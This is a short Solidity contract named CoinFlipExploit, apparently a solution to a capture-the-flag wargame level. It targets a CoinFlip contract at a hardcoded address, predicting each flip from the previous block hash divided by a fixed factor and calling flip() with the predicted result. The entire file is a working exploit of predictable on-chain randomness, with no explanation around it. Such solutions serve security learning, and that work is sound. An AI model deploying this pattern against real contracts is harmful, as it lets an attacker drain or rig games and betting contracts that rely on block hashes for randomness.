pragma solidity ^0.4.0;
import './CoinFlip.sol';

contract CoinFlipExploit {
    address contractAddress = 0x6f2509a0E0Cb56263CF8ceaf0758d19d27e7D053;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip contractInstance;

    constructor () public {
        contractInstance = CoinFlip(contractAddress);
    }

    uint256 lastHash;
    function attack() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number-1));
        if (lastHash == blockValue) revert();

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return contractInstance.flip(side);
    }
}
